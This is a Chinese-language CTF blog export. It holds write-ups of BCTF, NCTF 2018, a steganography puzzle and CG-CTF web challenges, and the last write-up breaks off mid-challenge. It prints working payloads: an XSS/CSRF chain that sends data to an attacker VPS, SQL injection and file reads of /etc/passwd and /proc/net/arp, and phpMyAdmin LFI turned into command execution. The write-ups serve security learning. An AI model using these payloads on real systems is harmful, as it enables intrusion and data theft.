$(&apos;#username&apos;).text(data[&apos;user_name&apos;]); $(&apos;#message&apos;).text(data[&apos;message&apos;]); document.getElementById(&quot;replyuid&quot;).value=data[&apos;uid&apos;]; if (parseInt(data[&apos;is_checked&apos;]) == 1) &#123; Status = &apos;&lt;div style=&quot;color:#04FF00&quot;&gt;Checked&lt;/div&gt;&apos;; &#125; else &#123; Status = &apos;&lt;div style=&quot;color:#FFA500&quot;&gt;Not Checked&lt;/div&gt;&apos;; &#125; document.getElementById(&quot;status&quot;).innerHTML = Status; &#125; else alert(&apos;Error: &apos; + data[&quot;error&quot;]); &#125; &#125;); &#125; 进到/admin/handle_message.php中，提示： {&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;CSRFToken &#39;&#39;is not correct&quot;} 注意到error双引号内部有个’’，猜测传入的csrftoken可能直接输出到了页面中 结合源码，发现csrftoken通过token参数使用post方法传入 传入后会回显token值，存在反射型XSS，构造类似&lt;img src=1 onerror=alert(/xss/)&gt;的payload时会发现对’/‘转义了。 接下来构造一个页面让管理员访问，这道题的评论链接会被bot机器人主动访问，因此构造csrf的html页面让bot访问。 之前发现了’/‘被转义了，所以这里我们使用svg或img进行xss，同时为了避免引号的问题，使用fromCharCode()方法或者使用base64编码再用atob()函数解码的方法。 12345String.fromCharCode(numX,numX,...,numX)fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。参数numX 一个或多个 Unicode 值，即要创建的字符串中的字符的 Unicode 编码。 html页面为 123456789101112131415&lt;html&gt; &lt;script&gt; window.onload =function()&#123; document.getElementById(&quot;f&quot;).submit(); &#125; &lt;/script&gt; &lt;form method=&quot;post&quot; action=&quot;http://seafaring.xctf.org.cn:9999/admin/handle_message.php&quot; id=&quot;f&quot;&gt; &lt;input name=&quot;token&quot; value=&quot;&lt;body&gt;&lt;img src=x onerror=eval(atob(&apos;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL0dDNkRURz8nK01hdGgucmFuZG9tKCk=&apos;))&gt;&lt;/body&gt;&quot;&gt; &lt;/form&gt; &lt;/html&gt; 这里的value内容也可以替换为 1&lt;body&gt;&lt;img src=x onerror=eval(String.fromCharCode(100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,41,46,115,114,99,61,39,104,116,46,99,110,47,69,121,76,83,53,99,103,39))&gt;&lt;/body&gt; 注释： 1234567&gt;&gt;&gt;atob(&apos;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL0dDNkRURz8nK01hdGgucmFuZG9tKCk=&apos;)&quot;s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://xsspt.com/GC6DTG?&apos;+Math.random()&quot;&gt;&gt;&gt;String.fromCharCode(100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,41,46,115,114,99,61,39,104,116,46,99,110,47,69,121,76,83,53,99,103,39)&quot;document.body.appendChild(document.createElement(&apos;script&apos;)).src=&apos;ht.cn/EyLS5cg&apos;&quot; 这里的链接地址是在xss平台上面建立的项目，引入js文件 当然也可以把js文件放在自己的vps上面 外部引入的js文件（Nu1l的师傅写的 ）： 12345678910111213141516171819202122232425function req(url,data)&#123; var xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;,url,false); xhr.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded&quot;); xhr.send(data); var resp = xhr.responseText; return resp;&#125;function getcsrf()&#123; var xhr = new XMLHttpRequest(); xhr.open(&quot;GET&quot;,&quot;http://seafaring.xctf.org.cn:9999/admin/index.php&quot;,false); xhr.send(); var res = xhr.responseText; var csrftoken = res.match(/csrf_token = \&quot;([a-z0-9]*)\&quot;/ig)[0].split(&apos;= &quot;&apos;)[1].replace(&apos;&quot;&apos;,&apos;&apos;); return csrftoken;&#125;function send(data)&#123; location.href = &quot;http://47.95.10.238/bctf.php?data=&quot;+escape(data);&#125;var ress = req(&quot;http://172.20.0.2:6379/&quot;,&quot;token=&quot;+getcsrf()+&quot;&amp;action=view_unreads&amp;status=3%20%20and%201%3D2%20union%20select%201%2Cload_file%280x2f70726f632f6e65742f617270%29%2C3%2C4%20from%20f111111ag%23&quot;);send(ress); send()函数中的href是自己的vps 发现返回了sqlquery debug信息 1&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT timestamp,user_name,uid,is_checked,message FROM feedbacks where uid=&apos;1&apos; ORDER BY id DESC &quot;&#125; 有一个接口存在数字型注入 1&#123;&quot;result&quot;:&quot;&quot;,&quot;error&quot;:&quot;sql query error! debug info:SELECT timestamp,user_name,uid,is_checked FROM feedbacks where is_checked=1\\&apos; ORDER BY id DESC limit 0,50&quot;&#125; 爆表爆字段最后拿flag 123&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;admin,f111111ag,feedbacks&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;flllllag&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125;&#123;&quot;result&quot;:[[&quot;1&quot;,&quot;bctf&#123;XsS_SQL1_7438x_2xfccmk&#125;&quot;,&quot;3&quot;,&quot;4&quot;]],&quot;error&quot;:&quot;&quot;&#125; 后记xss是很久之前看的了，一直没有像这样进行一次系统的利用过，这次算是了了一桩心愿 大二上学期接下来的日子准备复习四级，复习期末，学一些渗透姿势和python，闲暇时打打ctf，就过去了 十二月了，要买回家的车票了，这次不想坐飞机，看不到沈阳的雪了 周末看了将夜，很久前看过的小说拍剧了，很好看 红墙白雪，要你喜欢。]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[NCTF 2018]]></title>
    <url>%2F2018%2F11%2F29%2FNCTF-2018%2F</url>
    <content type="text"><![CDATA[前言上周末的nctf，自己除了签到也就做出来两道题，然后参考了一些网上师傅们赶出来的writeup整理出这篇博客。 前天和师傅们去做了BCTF的题，ctf从入门到自闭啊，现在只是知道了第一题的思路，其他的还在边看边等大佬们的writeup，所以先写一下今天复盘的nctf了~ 很烦的是我写这篇博客的时候平台服务器坏掉了，我做的时候还有一些没截图 github上的环境师傅们还没传完，我也懒得再搭环境截图了，我会尽量把学到的知识和思路讲解的清楚一些，大家如果想复现可以到这里找一下环境：传送门 Web签到题 点开链接发现跳到了百度，应该是重定向，burp抓个包重放一下就拿到flag了。 滴！晨跑打卡 一道sql注入的题，是我做出来的第一道题，这道题闭合一下单引号绕一下空格就可以了，绕空格的一些常见方法如下： %20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/ 我看网上的师傅们使用%a0绕过的，我当时好像是用%0b绕过的，但是不重要啦 构造回显payload?id=1&#39;%a0union%a0select%a01,2,3%a0and&#39;1&#39;=&#39;1 然后就开始常规的通过information_schema爆库爆表爆字段了 最后的payload为 ?id=1&#39;%a0union%a0select%a01,(select%a0th1s_1s_flag%a0from%a0flaaaaaaag.f144444444g),3%a0&#39; Go Lakers 这题开始做的有点迷啊，还是余师傅提醒，burp重放之后响应包往下拉了好久看到了提示 &lt;!--post me viewsource--&gt; 重放个post变量viewsource拿到了源代码，这里要注意一下改成POST包时要加一个头部字段 Content-type:application/x-www-form-urlencoded，在burp中看响应包会有很多html实体编码和php的代码高亮，这咋看得懂。跟学长学习了放在proxy里面forward一下就显示在浏览器里了，hhh又暴露了自己的菜啊 源码如下 12345678910111213141516171819202122232425262728293031323334&lt;?php error_reporting(0); include &apos;getip.php&apos;; ini_set(&apos;open_basedir&apos;,&apos;.&apos;); if(isset($_POST[&apos;viewsource&apos;]))&#123; highlight_file(__FILE__); die(); &#125; mt_srand(mktime()+$seed); function de_code($value)&#123; $value = base64_decode($value); $result = &apos;&apos;; for($i=0;$i&lt;strlen($value);$i++)&#123; $result .= chr(ord($value[$i])-$i*2); &#125; return $result; &#125; if(!(getip() === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;9527&apos;]) === &apos;nctf_is_good&apos; &amp;&amp; mt_rand(1,10000) === intval($_GET[&apos;go_Lakers&apos;])))&#123; header(&apos;location:https://bbs.hupu.com/24483652.html?share_from=kqapp&apos;); &#125; else&#123; echo &apos;great&apos;; &#125; echo file_get_contents(de_code($_GET[&apos;file_&apos;])); ?&gt;&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt;&lt;title&gt;嘻嘻嘻&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;h3&gt;题目在哪呢&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt; 这道题我开始的思路是要先满足if的条件，然后才能考虑file_get_contents()函数，不然就被重定向走了，还是问了一下余师傅才知道，这里在burp中follow只是加了个header头，但还是会执行下面的file_get_contents()语句。那就可以直接根据上面的de_code()函数写个编码的脚本就ok辣，要猜到flag藏在flag.php文件中哦。 12345678910&lt;?php function en_code($value)&#123; $result = &apos;&apos;; for($i=0;$i&lt;strlen($value);$i++)&#123; $result .= chr(ord($value[$i])+$i*2); &#125; $result = base64_encode($result); return $result; &#125; echo en_code(&apos;flag.php&apos;); ?&gt; 得到Zm5lbTZ6dH4=，用get传一下拿到flag 全球最大交友网站 这道题，是 .git 泄露，其实当时想到了，但是中途死于对git的操作一知半解吧 从p神的一篇文章中学习一下git获取源码的利用和原理：XDCTF2015代码审计全解 我当时进行了第一步操作，利用lijiejie的GitHack：https://github.com/lijiejie/GitHack 脚本获取到了一个readme.md文件，内容为Allsource files areingit tag1.0 ，考虑flag会在tag1.0版本中，应该要回滚版本。 在看师傅们writeup的时候发现一个可以将各个版本的源码提取出来的神器：Git_Extract 还有师傅用了 scrabble 脚本 git log查看历史版本，git show HEAD 版本号 回滚版本，flag在readme.txt中 这时候我突然想起来之前做cgctf用过的 dvcs-ripper 应该也可以吧，但是服务器已经关了没办法尝试了，以后再遇到类似的题再多尝试一下吧 小绿草之最强大脑 查看源代码得到hint 当时做题时一脸懵逼，源码泄露在哪里。 之后看wp文中师傅说到 “第一反应就是CTF中常有的BAK文件“ 访问index.php.bak下载文件 1234567891011121314151617181920212223242526272829303132&lt;?phpif(isset($_SESSION[&apos;ans&apos;]) &amp;&amp; isset($_POST[&apos;ans&apos;]))&#123; if(($_SESSION[&apos;ans&apos;])+intval($_POST[&apos;input&apos;])!=$_POST[&apos;ans&apos;])&#123; session_destroy(); echo &apos; &lt;script language=&quot;javascript&quot;&gt; alert(&quot;怎么没算对呢？&quot;); window.history.back(-1); &lt;/script&gt;&apos;; &#125; else&#123; if(intval(time())-$_SESSION[&apos;time&apos;]&lt;1)&#123; session_destroy(); echo &apos; &lt;script language=&quot;javascript&quot;&gt; alert(&quot;你手速太快啦，服务器承受不住!!!&quot;); window.history.back(-1); &lt;/script&gt; &apos;; &#125; if(intval(time())-$_SESSION[&apos;time&apos;]&gt;2)&#123; session_destroy(); echo &apos; &lt;script language=&quot;javascript&quot;&gt; alert(&quot;你算的太慢了少年！&quot;); window.history.back(-1); &lt;/script&gt; &apos;; &#125; echo &apos; &lt;script language=&quot;javascript&quot;&gt; alert(&quot;tql，算对了！！&quot;); &lt;/script&gt; &apos;; $_SESSION[&apos;count&apos;]++; &#125;&#125;?&gt; 关键信息： input 的变量经过了 php 的intval处理 计算时间要在 1-2 秒之间 算对的次数会累加 使用了intval函数来防止整数溢出的危害，所以我们输入的大于二十一位的数字经过该函数处理后发生了变化。要注意的是intval()函数在32位机器和64机器上的运行结果也是不一样的。 12&lt;?php echo intval(&apos;4200000000000000000000&apos;);?&gt;32位系统：2147483647 64位系统：9223372036854775807 改了一下网上的脚本跑出flag 1234567891011121314151617181920212223242526import requestsimport reimport times = requests.Session() # 保持当前会话的持续有效性url = &quot;http://ctfgame.acdxvfsvd.net:20004/&quot;number =&quot;4200000000000000000000&quot; #输入的数字r = s.get(url)math = &apos;&apos;headers = &#123; &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;, &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0&apos;,&#125;while(1): pattern =re.compile(r&apos;&lt;div style=&quot;display:inline;&quot;&gt;(.*?)&lt;/div&gt;&apos;) #构建正则 num = pattern.findall(r.text) #正则提取公式 result = &quot;9223372036854775807&quot;+&apos;+&apos;+math.join(num)[0:-1] #拼接真实的公式，切片是为了舍去等号 ans = eval(result) #利用eval直接来计算结果 data = &#123; &apos;input&apos;:&apos;4200000000000000000000&apos;, &apos;ans&apos;:ans &#125; r = s.post(url,headers=headers,data=data) time.sleep(1.5) #延时1.5秒 print(r.text) 基本操作 给了一个phpMyAdmin的网址，这题学到了phpMyAdmin本地文件包含漏洞 2018-06-21 ChaMd5安全团队公开了一个phpMyAdmin 4.8.1后台getshell，该漏洞利用不要求root帐号，只需能够登录 phpMyAdmin 便能够利用。 查看页面源代码发现Mysql版本是4.8.1，登录的账号密码是网上的弱口令组合guest+guest 这种文件包含漏洞可以读取任意文件，首先要知道在URL编码中%3f是用于分割实际URL和参数的 ，先判断一下根目录的位置为../../../../，但实际操作时发现，就算多加了几个../也没有关系，因为到根目录就没法继续往上了。 构建url： http://ctfgame.acdxvfsvd.net:20006/index.php?target=db_sql.php%253f/../../../../etc/passwd出现如下图回显验证该漏洞存在 我们知道phpMyAdmin默认自带phpinfo文件，访问 访问 http://ctfgame.acdxvfsvd.net:20006/index.php?target=db_sql.php%253f/../info.php 有一栏叫做”session_save_path”，这一项是专门用来保存session的路径的。而我们这道题就是通过本地文件包含session来读取sql执行语句中插入php代码，让本地文件包含的时候执行php语句。 session文件名默认为session_你的sessionid，sessionid就是你在浏览器中cookie的phpmyadmin的值，这里session日志的保存路径是/tmp/sess_你的sessionid 在phpMyAdmin中执行sql语句 select &#39;&lt;?php system(&quot;ls&quot;);?&gt;;&#39; 再访问http://ctfgame.acdxvfsvd.net:20006/index.php?target=db_sql.php%253f/../../../../temp/xxxxxx可以执行系统命令并得到回显 通过一系列的ls查找到可疑文件nctfffffffff 最后的payloadselect &#39;&lt;?php system(&quot;cd /&amp;&amp;cat nctfffffffff&quot;);?&gt;;&#39; 对phpMyAdmin 4.8.x本地文件包含利用的漏洞，我参考了VulnSpy的在线环境 MiscCalcNow 这道题学习了python的pwn库的使用，参考这篇 Exploit利器——Pwntools 要注意的是这个库对windows支持蛮不友好的，我直接在kali里用了 nc连接之后会显示一个要计算的表达式，要求两秒内算出，这题nc连接后回显的内容忘截图了，直接看脚本吧 123456789101112131415161718192021#!/user/bin/enc pythonfrom pwn import *result=0a = remote(&quot;ctfgame.acdxvfsvd.net&quot;,30003)a.recvuntil(&quot;Your Token:\n&quot;)a.sendline(&quot;hqd5NgJ5tr0ObfJliY0vsiZHahw3epkr&quot;)a.recvuntil(&quot;Before becoming a PWNer, you should know how to write script\n&quot;)a.recvuntil(&quot;Tools: python module -&gt; pwntools(sudo pip install pwn)/SOCKET/zio...\n&quot;)calc_str = a.recv(1024)number1 = calc_str[:25]iterator = calc_str[26:29]number2 = calc_str[30:].replace(&quot; &quot;,&quot;&quot;)print number1+iterator+number2if(iterator==&apos;add&apos;): result = int(number1) + int(number2)if(iterator==&apos;sub&apos;): result = int(number1) - int(number2)print resulta.sendline(str(result))s = a.recvrepeat()print s 后记现在是零点了，还想看看python，太菜了就少睡点觉吧！ 打完这次比赛发现自己好多题还是没有思路，还有写脚本的能力太弱了，正则也有很多细节没学好，接下来准备从核心编程和python黑帽子入手深入学一下python。 通过ctf发现自己很多常见漏洞之前都是一知半解的没有很深入的理解利用，接下来要静下心来多看看书。 要考四级了，也要期末了 希望自己能沉稳一点，每天都能比昨天的自己进步一点点]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道MISC带你走入双图隐写]]></title>
    <url>%2F2018%2F11%2F21%2F%E4%B8%80%E9%81%93MISC%E5%B8%A6%E4%BD%A0%E8%B5%B0%E5%85%A5%E5%8F%8C%E5%9B%BE%E9%9A%90%E5%86%99%2F</url>
    <content type="text"><![CDATA[前言隐写术是什么？顾名思义是隐藏信息书写的技术，是信息隐藏技术的一种。 隐写术中有一个很经典的模型，叫做Simmons模型，也是常说的囚犯问题。 Alice 和 Bob 分属两个牢房，为了合谋越狱需要进行通信，而通信的信件必须经过中间看守人Wendy的审阅。Wendy可以阅读信件的内容，而且阅读后可以决定是否传送这封信件。这时，对信息进行加密不可取，因为看守人会阅读传送的信息的内容，加密后的信息大概率会引起看守人的怀疑，看守人不但可以选择不发送，还可以以此为依据对两名犯人进行调查。 因此需要一种对通信过程隐藏的手段 ，即隐写术。简单概括，隐写术试图隐藏的是通信事件本身。 推荐一本我在某邮图书馆翻到的书 《数据隐藏技术解密》——[美]Michael Raggo 一道双图隐写的CTF题做题之前，我对一些常见文件格式分析和常用工具进行了一些了解，这篇文章不进行赘述了，有兴趣的可以自己了解一下，或者我以后闲下来可能会整理出来？？这里只推荐一篇 png文件结构的博客 题目图片链接：https://pan.baidu.com/s/1Ztx0o_-V8XhzBzvSSothtg 提取码：qdtf 先用Binwalk分析文件 发现藏了两张图片，用foremost分离 在kali中使用compare比较两个图片并生成一张比较图会发现左下角有一条红线，红线处就是存在不同的地方，这种情况一般是双图像运算。 compare生成比较文件命令 compare 1.png 2.png output.png 使用Stegsolve打开一个图片，然后用Analyse选项的Image Combiner功能再添加一个图片进行异或操作，这样会把两个图片相同的部分变为0，不同的部分保留。然后保存异或运算后生成的bmp图片，用WinHex打开这个图片会发现这个文件中大部分都为0，不为0的部分就是两张图片不相同的区间，也就是之前红线处图片的差异。 记录不为0部分的偏移量区间，把原来分离出来的两个图片文用画图板另存为bmp格式，因为XOR异或出来的图片格式为BMP需要使用相同格式的图片寻找差异处。 用winhex打开两个图片，分别找到对应的偏移量区间如下 发现其中的差异是第二张图片中一些字节被替换成了00或01，找一下规律发现是每隔两个字节替换一次（每三个Hex的第一个Hex都是00或01，其实每三个Hex代表一个RGB通道，也就是信息隐藏在R通道中），分析这些0和1连接到一起可能会产生二进制信息，但是又不能挨个打出来吧。先把这一段十六进制数据复制下来，找到规律利用python切片连接这些01。 这里是将一串binary写入R通道中的时候，0变成了00， 1变成了01。 得到的01数据长度len()一下发现是8的倍数，这时可以直接使用JPK工具格式化二进制数据并转换成Ascii码 得到flag 也可以自己写一个脚本来处理这串01序列 1.py 12345678import sysstr=&quot;0100100101010011010001110111101101000101001101000111001101011001010111110101001101110100010001010110011100110100011011100011000001100111010100100011010001110000010010000111100101111101&quot;i = 0while i&lt;len(str): sys.stdout.write(chr(int(str[i:i+8],2))) i+=8print 走进双图隐写双图隐写泛指CTF竞赛中所有以两张图片为解题线索的题型，这里的两张图片可以指给出一张图片然后隐藏了另一张图片，也可以指直接给出了两张图片但是需要两张图片结合分析来提取出隐藏信息。 双图隐写原理： 图像格式拼接 不同的图像格式存在不同的文件头和文件尾 图层叠加 图像由图图叠加而成，图层由像素组成，每一张图层可以理解为一层透明的“玻璃”，它们各自包含独立的内容，可以理解为将各个图层从上到下依次重叠，然后俯视观测第一张图层，各个图层显示的叠加效果为图像最后的显示效果。 图像运算 实质上是像素的运算，两张图像相加，实质上是两张图像对应位置的像素相加 这道题的考点是双图像运算，这种题目的特征为binwalk发现的两张图片分离后看起来完全相同，处理时可能对两张图片进行异或运算，两张图片的差异数据中存在隐藏信息。 写在后面最近感觉自己也没学啥，看了看隐写术的常见套路，回头再把那本书看完就圆满了。 等周末打打看NJUPTCTF就滚回去学python和java了。 不想写了，这篇博客就草草收尾了。]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CG-CTF web篇零基础指南]]></title>
    <url>%2F2018%2F11%2F14%2FCG-CTF-web%E7%AF%87%E9%9B%B6%E5%9F%BA%E7%A1%80%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[前言用了三四天终于把南邮ctf平台的web题做了差不多，也算对ctf多了一些了解，之前发过一篇综合题(2)的writeup，这次准备从头整理一遍。因为我自己就是个萌新，这两天通过做题学到了很多，所以整理的会很详细！ 南邮CG CTF web传送门 writeup1.签到题直接看源代码就可以看到flag了 2.md5 collisionphp源码 12345678910$md51 = md5(&apos;QNKCDZO&apos;);$a = @$_GET[&apos;a&apos;];$md52 = @md5($a);if(isset($a))&#123;if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) &#123; echo &quot;nctf&#123;*****************&#125;&quot;;&#125; else &#123; echo &quot;false!!!&quot;;&#125;&#125;else&#123;echo &quot;please input a&quot;;&#125; php弱类型的利用，这道题满常见的，需要传入一个参数a不等于 ‘QNKCDZO’，但是md5加密后的值与 ‘QNKCDZO’ md5加密后的松散比较相等。md5(‘QNKCDZO’)=’0e830400451993494058024219903391’ ，而PHP在处理哈希字符串时，会利用!=或==来对哈希值进行比较，它把每一个以0E开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以0E开头的，那么PHP将会认为他们相同，都是0。 所以给 a 传入一个 md5 加密后也为 0e 开头的字符串即可，这样的字符串一搜一大把了 这里我传了 ?a=s878926199a 拿到flag tips： 1、在PHP中，@被称为错误控制操作符，前置@符号的表达式产生的任何错误都将被忽略。 2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明不安全后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位或16位十六进制串，由[0-9a-e]组成。 3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换而后者不会。 3.签到2 这道题是前端对输入框长度的限制，F12查看页面代码发现 maxlength=&quot;10&quot; 而需要输入的口令 “zhimakaimen为11位，直接在查看器更改10为任意大于等于11的数再输入口令即可。 4.这题不是web打开题目地址发现一个可爱的动图，把图片下载到本地，用文本编辑器或winHex打开(记事本就可以了)，Ctrl + F 查找flag，在末尾。 5.层层递进又是一道查看源代码的题，在\&lt;iframe>标签中跟着链接依次访问嵌套的SO.html -&gt; S0.html-&gt;SO.htm -&gt;S0.htm-&gt;404.html ，在404.html注释中找到flag 6.AAencodejavascript aaencode 这道题链接坏了，在南邮旧ctf平台找到了这道题的链接 打开题目是乱码，用火狐Unicode编码后是颜文字 提示是js aaencode，是一种把js代码编码成颜文字的编码方式，直接把这段颜文字拉到控制台执行，发现有错误 错误提示：ωﾟﾉ is not defined ，即 ωﾟﾉ 这个变量没有被定义，那我们先在控制台定义这个变量，再执行代码 拿到flag 7.单身二十年访问 http://chinalover.sinaapp.com/web8/search_key.php 会被重定向到 http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php ，重定向会被浏览器自动处理，burp抓包repeater重放一下拿到flag。 8.php decode123456789&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;echo CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;); 应该是一道编码题，但是可以直接在代码在线运行的网站允许一下这段php代码，就可以跑出flag了 9.文件包含使用php的filter协议读取index.php payload：http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=./index.php 显示了base64编码后的index.php源码，这种方法经常用得到，把得到的编码在在线网站解码得到源码 12345678910111213141516&lt;html&gt; &lt;title&gt;asdf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;&#125; $file=$_GET[&apos;file&apos;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 查看源码得到flag 更多php伪协议实现命令执行的姿势可见 传送门 10.单身一百年也没用这道题的flag藏在了响应信息中 11.Download~!这道题链接找不到了，提示是别下音乐 看网上的解题是进去之后会看到两个下载音乐的链接，查看源代码发现星星点灯的下载链接为download.php?url=eGluZ3hpbmdkaWFuZGVuZy5tcDM=，经过了base64加密，解码内容为xingxingdiandeng.mp3。 尝试下载其他页面如index.php download.php及它们base64加密后的页面，发现download.php可以下载 打开下载的download文件，发现首先对url参数进行了base64解码，并且只有四个文件能够正常下载，否则提示Access Forbidden！下载hereiskey.php，得到flag 。 12.COOKIETIP: 0==not F12看网络，把请求头中的Cookie：Login=0 改成 Login=1 重新发包后在响应主体中拿到flag 13.MYSQL根据提示查看robots.txt （robots.txt是一个告诉爬虫那些东西不能爬的文件，在ctf中是一个经常存在的有提示信息的文件） 123456789101112131415TIP:sql.php&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&apos;$id&apos;&quot;)); if ($_GET[id]==1024) &#123; echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 说明要向sql.php提交一个id，使得intval($_GET[id])为1024而$_GET[id]==1024为假。 这里有两种做法 1.传入id=1024.1，intval()函数会把1024.1取整为1024 2.利用intval()函数的特性：只识别到非数字的那一位，而松散比较的强制类型转换会把e当作科学记数法的一部分处理，即科传入id=1024e1 14.GBK Injection 把id参数的值改成2，3得到两个提示信息：gbk_sql_injection 和 the fourth table 在参数后面加个单引号，发现sql语句转译成了your sql:select id,title from news where id = &#39;3\&#39;&#39; 判断存在GBK宽字节注入， flag在第四个表中，用sqlmap一下就跑出来了哈哈 payload： python2 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 -T ctf4 -C flag --dump 手工注入一下： 先介绍宽字节注入的原理如下， 当传入 id=1’ 时，单引号会被转义符(反斜线)转义，导致id参数无法逃逸单引号的包围。由于MySQL执行查询时会跳过畸形字符，当输入参数 id=1%df’ 时，参数会经过转义和url编码变为 id=1%df%5c%27，%5c 是反斜杠的url编码，%27 是单引号的url编码。而在GBK编码中，%df%5c是繁体字”連 “，这时单引号成功逃逸。 1234567891011121314151617181920#第一步 判断是否存在注入http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 和http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%df%27--+ 返回结果相同。#第二步 使用union查询数据库名先用 chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df%27 order by 2--+ 判断有两列再用 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df%27 union select null,database()--+得到数据库名为&apos;sae-chinalover&apos;#第三步 查询&apos;sae-chinalover&apos;数据库的第四张表名http://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&apos; union select null,table_name from information_schema.tables where table_schema=database() limit 3,1--+得到第四张表表名为&apos;ctf4&apos;tips:1.MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。2.limit用法是这样LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;，必须放在where后面。#第四步 从表&apos;ctf4&apos;中查询flaghttp://chinalover.sinaapp.com/SQL-GBK/index.php?id=0%df&apos; union select null,flag from ctf4--+这里的列名&apos;flag&apos;是猜的，也可以从上一步中的information_schema数据库中查询列名，关于列名的信息在information_schema.columns表中的column_name字段。 15./x00这道题学到了点东西！ 12345678910view-source: if (isset ($_GET[&apos;nctf&apos;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;nctf&apos;]) === FALSE) echo &apos;必须输入数字才行&apos;; else if (strpos ($_GET[&apos;nctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) die(&apos;Flag: &apos;.$flag); else echo &apos;骚年，继续努力吧啊~&apos;; &#125; 要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos()找到#biubiubiu 有两种方法： 1.ereg()正则函数会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00 所以提交nctf=1%00%23biubiubiu，即可拿到flag 2.ereg和strpos函数传入数组后返回的都是NULL 所以提交nctf[]=，拿到flag tips: 由于在PHP中string的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\0标识字符串的结束）会忽略”a NUL byte”后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子，还有很多可以自行百度。 16.bypass again依旧是弱类型 1234567if (isset($_GET[&apos;a&apos;]) and isset($_GET[&apos;b&apos;])) &#123;if ($_GET[&apos;a&apos;] != $_GET[&apos;b&apos;])if 